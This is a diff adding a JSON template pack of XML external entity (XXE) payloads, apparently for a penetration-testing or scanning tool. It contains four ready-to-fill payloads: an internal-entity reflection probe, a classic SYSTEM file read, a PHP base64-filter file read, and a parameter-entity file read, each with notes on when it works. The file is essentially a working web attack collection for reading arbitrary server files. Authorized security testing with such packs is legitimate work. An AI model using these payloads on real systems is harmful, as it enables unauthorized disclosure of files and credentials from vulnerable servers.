@@ -1,0 +1,53 @@
+{
+  "pack": "builtin-xxe",
+  "category": "xxe",
+  "source": "builtin",
+  "license": "MIT",
+  "templates": [
+    {
+      "id": "xxe-detect-internal",
+      "name": "Internal entity reflection probe",
+      "category": "xxe",
+      "mode": "detection",
+      "template": "<?xml version=\"1.0\"?><!DOCTYPE poad [<!ENTITY poad \"<<POAD_MARKER>>\">]><root>&poad;</root>",
+      "required": ["marker"],
+      "whole_document": true,
+      "tags": ["detection"],
+      "notes": "If the marker is reflected, internal entities are processed (DTD allowed)."
+    },
+    {
+      "id": "xxe-file-system",
+      "name": "External entity file read (SYSTEM)",
+      "category": "xxe",
+      "mode": "file-read",
+      "template": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file://<<POAD_FILE>>\">]><root>&xxe;</root>",
+      "required": ["file"],
+      "whole_document": true,
+      "tags": ["file-read"],
+      "notes": "Classic XXE file read. Requires external general entities enabled."
+    },
+    {
+      "id": "xxe-file-php-b64",
+      "name": "PHP base64 filter file read",
+      "category": "xxe",
+      "mode": "file-read",
+      "template": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=<<POAD_FILE>>\">]><root>&xxe;</root>",
+      "required": ["file"],
+      "whole_document": true,
+      "version_dependent": true,
+      "tags": ["file-read", "php"],
+      "notes": "PHP-only; returns base64 so binary/multiline files survive XML parsing."
+    },
+    {
+      "id": "xxe-param-entity",
+      "name": "Parameter entity file read",
+      "category": "xxe",
+      "mode": "file-read",
+      "template": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"file://<<POAD_FILE>>\"> %xxe;]><root>test</root>",
+      "required": ["file"],
+      "whole_document": true,
+      "tags": ["file-read"],
+      "notes": "Parameter-entity form; some parsers accept this where general entities are blocked."
+    }
+  ]
+}
